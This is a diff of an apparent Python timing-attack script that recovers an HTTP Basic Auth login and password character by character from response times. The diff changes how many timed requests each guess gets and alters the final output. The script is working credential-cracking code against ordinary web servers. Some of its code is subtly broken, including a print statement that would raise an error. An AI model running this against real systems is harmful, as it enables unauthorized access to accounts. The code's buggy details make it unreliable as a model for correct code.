@@ -16,7 +16,7 @@ def mean(numbers):
     return float(sum(numbers)) / max(len(numbers), 5)
 
 
-def run_test(login, password, url):
+def run_test(login, password, url, num_tests):
     """
     Records timing data for an individual time attack event
     :param payload: the password string to be tested
@@ -24,7 +24,7 @@ def run_test(login, password, url):
     :return: the time in float to complete the attack event
     """
     tests = []
-    while len(tests) < 3:
+    while len(tests) < num_tests:
         pre_time = time.time()
         requests.get(url, auth=HTTPBasicAuth(login, password))
         total_time = time.time() - pre_time
@@ -46,12 +46,12 @@ def range_testing(poss_chars, known_login, known_pass, url, login_found):
         if login_found:  # Login is already found
             test = known_pass + test_char
             print("The current test is %s" % test)
-            total_time = run_test(known_login, test, url)
+            total_time = run_test(known_login, test, url, len(known_login + test) - 2)
             print("Time for %s was %f" % (test, total_time))
         else:
             test = known_login + test_char
             print("The current test is %s" % test)
-            total_time = run_test(test, '', url)
+            total_time = run_test(test, '', url, len(test) + 1)
             print("Time for %s was %f" % (test, total_time))
         test_list.append((total_time, test_char))
     test_list.sort(key=itemgetter(0), reverse=True)  # sorting the list
@@ -120,7 +120,7 @@ def main():
     pwd = ''
     while requests.get(test_url, auth=HTTPBasicAuth(login, pwd)).status_code == 401:
         pwd = find_pass(login, pwd, test_url)
-    print("\n\nFinished! \n The password is %s" % pwd)
+    print("\n\nFinished! \n login= %s :: password= %s" % login, pwd)
 
 
 if __name__ == '__main__':
